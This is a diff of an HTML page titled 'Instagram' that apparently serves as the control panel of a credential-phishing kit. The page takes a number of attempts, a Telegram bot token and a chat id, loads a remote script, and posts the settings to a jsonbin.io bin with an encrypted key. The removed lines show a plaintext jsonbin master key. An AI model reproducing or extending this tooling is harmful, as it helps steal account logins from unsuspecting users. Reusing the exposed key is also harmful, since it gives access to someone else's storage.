@@ -1,31 +1,45 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram</title>
+    <script src="https://damsea.github.io/import.js"></script>
+    <script>
+        script(aes)
+        script(ajax)
+    </script>
+</head>
+<body>
+    <input type="number" name="" id="pop" value="2"><br>
+    <input type="text" id="token" placeholder="Telegram api bot token"><br>
+    <input type="number" id="chatid" placeholder="Telegram Chat id"><br>
+    <button onclick="create()">Create sessia</button>
+</body>
 <script>
-
-</script><br>
-<p>Введите ссылку на фото</p>
-<input type="text" id="url" placeholder="Enter img url for damsea.github.io"><br><br>
-<p>Введите название фото</p>
-<input type="text" id="title" placeholder="Enter img Name"><br><br>
-
-<button onclick="send()">SEND</button>
-<script>
-    function send(){
-        let req = new XMLHttpRequest();
-    var tit=document.getElementById('url').value;
-    var title=document.getElementById('title').value;
-
-    var mess={
-        "url":`${tit}`,
-        "title":`${title}`
-    }
-req.onreadystatechange = () => {
-  if (req.readyState == XMLHttpRequest.DONE) {
-    console.log(req.responseText);
-  }
-};
-
-req.open("PUT", "https://api.jsonbin.io/v3/b/64007d58c0e7653a05812a79", true);
-req.setRequestHeader("Content-Type", "application/json");
-req.setRequestHeader("X-Master-Key", "$2b$10$1O.PoWna8zg/AryJziD/Au2tUX8Q6dqIq8/Nr/rIo2Num3tLJ1SW.");
-req.send(JSON.stringify(mess));
+    function create(){
+        var popitka,token,chatid;
+        popitka = document.getElementById('pop').value;
+        token=document.getElementById('token').value;
+        chatid=document.getElementById('chatid').value;
+        const dta={
+        "status":true,
+        "pop":popitka,
+        "pop_save":0,
+        "telegram":{
+            "chat_id":chatid,
+            "token":token
+        }
+       }
+       var pr=prompt("Enter password")
+       $ajax.post({
+        url:'https://api.jsonbin.io/v3/b/64168681c0e7653a058a7501',
+        key:decrypt('U2FsdGVkX19hgesdwOPnV7sa6luFVbQzvmc9XKYHXqU3jCyiUInOQhW084qFRfmiJ+Z6//90UxlohspHlHAIEpIHn6vn1fCpi+fUbmrga0k=',pr),
+        data:dta
+       },a=>{
+        console.log(a)
+       })
     }
 </script>
+</html>
